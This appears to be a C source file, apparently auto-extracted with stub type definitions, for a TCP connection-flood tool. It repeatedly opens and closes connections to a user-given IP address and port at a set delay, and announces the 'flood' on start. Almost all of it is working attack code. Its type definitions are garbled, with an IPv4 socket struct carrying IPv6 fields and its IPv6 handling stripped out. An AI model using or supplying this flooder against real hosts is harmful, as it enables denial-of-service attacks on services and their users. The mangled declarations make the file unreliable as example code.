
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


struct TYPE_4__ {int s_addr; } ;
struct TYPE_3__ {int s6_addr; } ;
struct sockaddr_in6 {void* sin_port; TYPE_2__ sin_addr; void* sin_family; TYPE_1__ sin6_addr; void* sin6_port; void* sin6_family; } ;
struct sockaddr_in {void* sin_port; TYPE_2__ sin_addr; void* sin_family; TYPE_1__ sin6_addr; void* sin6_port; void* sin6_family; } ;
struct sockaddr {int dummy; } ;
typedef int sin6 ;
typedef int sin ;


 void* AF_INET ;
 void* AF_INET6 ;
 int DEFP ;
 int DEFT ;
 int SOCK_STREAM ;
 int TIME ;
 int VALID_PORT (int) ;
 int close (int) ;
 int connect (int,struct sockaddr*,int) ;
 int exit (int ) ;
 int fprintf (int ,char*) ;
 void* htons (int) ;
 int inet_addr (char*) ;
 int inet_pton (void*,char*,int ) ;
 int memset (struct sockaddr_in6*,int ,int) ;
 int perror (char*) ;
 int printf (char*,...) ;
 int socket (void*,int ,int ) ;
 int stderr ;
 int strcmp (char*,char*) ;
 char* strrchr (char*,char) ;
 int strtol (char*,int *,int) ;
 int usleep (int) ;

int main(int argc,char *argv[])
{

   int ret, fd, i, ip6 = 0;
   int times = DEFT, port = DEFP, delay = TIME;
   struct sockaddr_in sin;





   if( argc < 2 )
   {
       char *pname;

       if(!(pname = strrchr(argv[0],'/')))
          pname = argv[0];
       else
          pname++;

       printf("Usage: %s [-6] ip4/6 [port] [delay (ms)] [times]\n", pname);
       exit (0);
   }

   if(!strcmp(argv[1],"-6"))
   {




      argv++;
      argc--;
   }

   if(argc > 2)
   {
      port = strtol(argv[2], ((void*)0), 10);
      if(!VALID_PORT(port))
      {
         fprintf(stderr,"Invalid port number. Using default\n");
         port = DEFP;
      }
   }

   if(argc > 3)
      delay = strtol(argv[3], ((void*)0), 10);

   if(argc > 4)
      times = strtol(argv[4], ((void*)0), 10);

   printf("Started with %s flood to %s on %d for %d times!\n",
         (ip6 == 1) ? "ipv6" : "ipv4", argv[1], port, times);

   for (i = 0; i < times; i++)
   {
         fd = socket(AF_INET, SOCK_STREAM, 0);
         memset(&sin, 0, sizeof(sin));

         sin.sin_family = AF_INET;
         sin.sin_addr.s_addr = inet_addr(argv[1]);
         sin.sin_port = htons(port);







         ret = connect(fd, (struct sockaddr *)&sin, sizeof(sin));

      if(ret < 0)
      {
         printf("connect %d failed.\n",i);
         perror("connect");
         break;
      }

      printf("Connection no. %d\n",i);
      close(fd);
      usleep(delay);
   }
}
